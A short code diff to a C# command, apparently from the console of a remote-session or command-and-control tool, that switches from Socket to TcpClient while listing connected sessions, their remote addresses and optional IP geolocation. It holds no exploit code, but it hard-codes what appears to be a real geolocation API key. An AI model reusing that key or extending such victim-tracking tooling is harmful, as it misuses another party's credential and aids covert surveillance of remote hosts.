@@ -23,9 +23,9 @@ namespace demilis.Command.Commands
             int consoleWidth = Console.WindowWidth; // need 2 account for uneven numbers
             int activeSessions = 0;
 
-            foreach (Socket socket in Program.dictionary.Values)
+            foreach (TcpClient client in Program.dictionary.Values)
             {
-                if (socket.Connected)
+                if (client.Connected)
                 {
                     activeSessions++;
                 }
@@ -48,7 +48,7 @@ namespace demilis.Command.Commands
                     if (printedLines % 2 == 0) { Console.ForegroundColor = ConsoleColor.DarkGray; }
                     string toWrite = $"Session {session} ";
                     while (toWrite.Length < consoleWidth / 3) { toWrite += " "; }
-                    toWrite += "| " + Program.dictionary[session].RemoteEndPoint + " ";
+                    toWrite += "| " + Program.dictionary[session].Client.RemoteEndPoint + " ";
                     while (toWrite.Length < consoleWidth / 1.5) { toWrite += " "; }
 
                     if (Program.useapi)
@@ -58,7 +58,7 @@ namespace demilis.Command.Commands
                             IPGeolocationAPI api = new IPGeolocationAPI("9397b3fe90f5426a8556253450d51005");
 
                             GeolocationParams geoParams = new GeolocationParams();
-                            geoParams.SetIp(GetIPFromEndPoint(Program.dictionary[session].RemoteEndPoint));
+                            geoParams.SetIp(GetIPFromEndPoint(Program.dictionary[session].Client.RemoteEndPoint));
                             geoParams.SetFields("geo,time_zone,currency");
 
                             Geolocation geolocation = api.GetGeolocation(geoParams);
